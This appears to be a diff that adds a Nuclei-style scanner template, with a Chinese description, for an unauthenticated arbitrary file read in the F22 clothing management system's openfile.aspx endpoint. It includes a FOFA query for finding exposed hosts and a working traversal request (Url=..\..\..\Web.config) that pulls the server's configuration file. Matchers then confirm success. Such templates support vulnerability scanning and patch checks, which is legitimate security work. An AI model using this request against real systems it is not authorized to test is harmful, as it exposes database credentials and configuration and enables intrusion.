@@ -1,0 +1,36 @@
+id: F22-openfile_aspx-File-reading
+
+info:
+  name: "F22 服装管理软件系统 openfile.aspx 接口任意文件读取漏洞"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: body="b28web/Utility/"
+      F22服装管理软件系统在openfile.aspx接口实现中存在文件访问控制缺陷，攻击者可利用该漏洞在未认证状态下访问系统关键文件（包括但不限于数据库配置文件、系统配置文件等敏感资源）。该漏洞可能导致系统敏感信息泄露，进而引发严重安全风险。
+  reference:
+  - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247488913&idx=1&sn=394075d44d6b47092d914c4fffb0362a&chksm=c267a0a2f51029b489aa8073f6f767636f8bd310501c40fee1daedcfc89f84db777c597d9c3f&token=385896921&lang=zh_CN&poc_token=HLMgLGejBhVFR9nCHz6xvWJK_2yCczTJG9wGPpk5
+  tags: F22 服装管理软件系统
+
+
+http:
+- raw:
+  - |
+    GET /oa/isprit/module/openfile.aspx?Url=..\..\..\Web.config HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - '<configuration>'
+    - '</configuration>'
+    - 'machine.config.comments'
+    condition: and
+  - type: status
+    status:
+    - 200
+
+
+
